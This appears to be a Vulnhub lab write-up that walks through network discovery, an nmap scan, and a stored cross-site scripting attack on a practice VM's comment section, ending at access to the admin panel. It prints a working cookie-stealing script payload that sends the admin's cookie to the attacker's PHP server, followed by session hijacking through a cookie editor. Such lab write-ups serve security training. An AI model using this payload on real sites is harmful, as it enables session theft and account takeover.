* * *
### Vulnhub:Xss_to_Sql
* * *
### Challenge description:

![2023-12-07_18-24](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/261fbeb3-3a6c-4488-ba5f-9dcfda0de8dd)

- Find the vm's ip address with netdiscover

       sudo netdiscover -r <ip>
 ![2023-12-14_18-07](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f48777b6-2b77-4408-bb60-13acfa10ea9f)
 
- Scan ip with nmap
   
      nmap -sV -p1-100 192.168.184.130
      Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-14 18:08 EST
      Nmap scan report for 192.168.184.130
      Host is up (0.0013s latency).
      Not shown: 98 closed tcp ports (conn-refused)
      PORT   STATE SERVICE VERSION
      22/tcp open  ssh     OpenSSH 5.5p1 Debian 6+squeeze4 (protocol 2.0)
      80/tcp open  http    Apache httpd 2.2.16 ((Debian))
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
- The server is hosting a webpage and it has a comment section

  ![2023-12-14_18-12](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/fa501b37-d711-4722-83cc-be50eb18709d)

- The comment section is vulnerable to stored cross-site scripting, we can use it to escalate privileges by stealing the admin's cookie

   ![2023-12-14_18-15](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9ea6f03c-5e6e-4ca9-9d29-a6081f02b610)

- Start a server with php

      php -S <ip:port>
- Use this payload

      <script>window.location="http://192.168.184.128:9000"+"?cookie="+document.cookie</script>

- Admin's cookie received

  ![2023-12-14_18-24](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9a6688bd-0f40-4411-8734-521ad3452844)

- Edit the cookie with firefox cookie editor

   ![2023-12-14_18-23](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9612c9e3-c9d8-4108-a7e4-e93e3da35875)

- Admin panel accessed

    ![2023-12-14_18-26](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/78624310-3dde-4d6b-9386-bbf972262ea1)

  
  


    
  
